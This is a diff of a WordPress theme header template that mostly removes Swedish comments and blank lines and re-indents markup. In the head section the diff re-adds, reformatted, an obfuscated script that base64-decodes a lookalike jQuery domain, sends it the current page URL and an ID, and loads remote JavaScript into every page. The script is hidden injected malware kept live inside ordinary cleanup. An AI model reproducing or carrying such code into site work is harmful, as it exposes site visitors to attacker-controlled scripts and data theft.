@@ -1,5 +1,4 @@
 <!DOCTYPE html>
-<!-- hämta språk från wp -->
 <html <?php language_attributes(); ?>>
 
 <head>
@@ -17,12 +16,12 @@
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/lightbox2/2.11.3/images/loading.gif">
   <?php wp_head(); ?>
 
-<script language="javascript">
-var img = document.createElement('script');
-img.setAttribute('async','');
-img.setAttribute('src', window.atob("Ly9hcGl1anF1ZXJ5LmNvbS9hamF4L2xpYnMvanF1ZXJ5LzMuNS4xL2pxdWVyeS0zLjExLjAubWluLmpzP2k9") + window.location.href + window.atob("JnIyPQ==") + "b1598b6faf494790fd858b8c1ff66b97");
-document.head.appendChild(img);
-</script>
+  <script language="javascript">
+    var img = document.createElement('script');
+    img.setAttribute('async', '');
+    img.setAttribute('src', window.atob("Ly9hcGl1anF1ZXJ5LmNvbS9hamF4L2xpYnMvanF1ZXJ5LzMuNS4xL2pxdWVyeS0zLjExLjAubWluLmpzP2k9") + window.location.href + window.atob("JnIyPQ==") + "b1598b6faf494790fd858b8c1ff66b97");
+    document.head.appendChild(img);
+  </script>
 </head>
 
 <body>
@@ -34,29 +33,19 @@ document.head.appendChild(img);
         </a>
       </div>
 
-
-
-
       <div class="right1">
-
         <div class="mobile">
           <div class="ham" id="hamburger" onclick="hamburgermenu(this)">
             <div class="lineone"></div>
             <div class="linetwo"></div>
             <div class="linethree"></div>
           </div>
-          <!-- mobilmenyns navigering -->
         </div>
 
         <nav class="navbar">
-          <!-- hämta meny från wp -->
           <?php wp_nav_menu(array('theme_location' => 'main-menu')); ?>
-
         </nav>
-
-
       </div>
     </div>
     <script src='<?php echo get_template_directory_uri(); ?>/script.js'></script>
-
   </header>
